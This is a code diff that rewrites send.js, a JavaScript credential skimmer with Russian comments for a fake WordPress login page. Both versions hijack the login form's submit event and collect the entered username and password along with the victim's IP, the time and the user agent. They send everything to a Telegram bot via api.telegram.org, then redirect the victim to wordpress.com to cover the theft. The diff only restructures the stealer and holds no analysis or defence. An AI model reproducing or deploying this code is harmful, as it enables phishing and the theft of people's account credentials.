@@ -1,56 +1,88 @@
-document.getElementById('loginform').addEventListener('submit', async function(e) {
-    e.preventDefault();
-    e.stopPropagation();
+// send.js
+(function() {
+    'use strict';
     
-    console.log("Скрипт send.js начал работу!");
-    console.log("BOT_TOKEN из config:", window.BOT_TOKEN);  // Проверка, что config загрузился
-    console.log("CHAT_ID из config:", window.CHAT_ID);
-
-    const formData = new FormData(this);
-    const login = formData.get('log');
-    const password = formData.get('pwd');
-
-    const message = `🔐 НОВЫЕ ДАННЫЕ WORDPRESS 🔐\nЛогин: ${login}\nПароль: ${password}\nIP: ${await getIP()}\nВремя: ${new Date().toLocaleString()}\nUser Agent: ${navigator.userAgent}`;
-    
-    console.log("Сообщение для отправки:", message);
-
-    try {
-        const response = await fetch(`https://api.telegram.org/bot${window.BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                chat_id: window.CHAT_ID,
-                text: message
-            })
-        });
-
-        const responseData = await response.json();
-        console.log("Ответ от Telegram API:", responseData);
-
-        if (response.ok) {
-            console.log("Успешно отправлено!");
-        } else {
-            console.error("Ошибка от Telegram:", responseData);
+    // Ждем полной загрузки DOM
+    document.addEventListener('DOMContentLoaded', function() {
+        const form = document.getElementById('loginform');
+        
+        if (!form) {
+            console.error("Форма loginform не найдена!");
+            return;
         }
-
-    } catch (error) {
-        console.error('Ошибка сети или отправки:', error);
+        
+        form.addEventListener('submit', function(e) {
+            // Предотвращаем стандартную отправку
+            e.preventDefault();
+            e.stopPropagation();
+            
+            console.log("Скрипт send.js начал работу!");
+            console.log("BOT_TOKEN из config:", window.BOT_TOKEN);
+            console.log("CHAT_ID из config:", window.CHAT_ID);
+            
+            // Получаем данные из формы
+            const login = form.querySelector('input[name="log"]').value;
+            const password = form.querySelector('input[name="pwd"]').value;
+            
+            // Формируем сообщение
+            const message = '🔐 НОВЫЕ ДАННЫЕ WORDPRESS 🔐\n' +
+                'Логин: ' + login + '\n' +
+                'Пароль: ' + password + '\n' +
+                'IP: ' + window.userIP + '\n' +
+                'Время: ' + new Date().toLocaleString() + '\n' +
+                'User Agent: ' + navigator.userAgent;
+            
+            console.log("Сообщение для отправки:", message);
+            
+            // Отправляем в Telegram
+            const url = 'https://api.telegram.org/bot' + window.BOT_TOKEN + '/sendMessage';
+            
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: window.CHAT_ID,
+                    text: message
+                })
+            })
+            .then(function(response) {
+                return response.json();
+            })
+            .then(function(data) {
+                console.log("Ответ от Telegram:", data);
+                if (data.ok) {
+                    console.log("Успешно отправлено!");
+                } else {
+                    console.error("Ошибка от Telegram:", data);
+                }
+            })
+            .catch(function(error) {
+                console.error("Ошибка отправки:", error);
+            })
+            .finally(function() {
+                // Перенаправляем через 1 секунду
+                setTimeout(function() {
+                    window.location.href = 'https://wordpress.com/';
+                }, 1000);
+            });
+        });
+    });
+    
+    // Получаем IP пользователя
+    function fetchIP() {
+        fetch('https://api.ipify.org?format=json')
+            .then(function(response) {
+                return response.json();
+            })
+            .then(function(data) {
+                window.userIP = data.ip;
+            })
+            .catch(function() {
+                window.userIP = 'Не удалось определить';
+            });
     }
     
-    // Перенаправление ПОСЛЕ отправки
-    setTimeout(() => {
-        window.location.href = 'https://wordpress.com/';
-    }, 1500);
-});
-
-async function getIP() {
-    try {
-        const response = await fetch('https://api.ipify.org?format=json');
-        const data = await response.json();
-        return data.ip;
-    } catch {
-        return 'Не удалось определить';
-    }
-}
+    fetchIP();
+})();
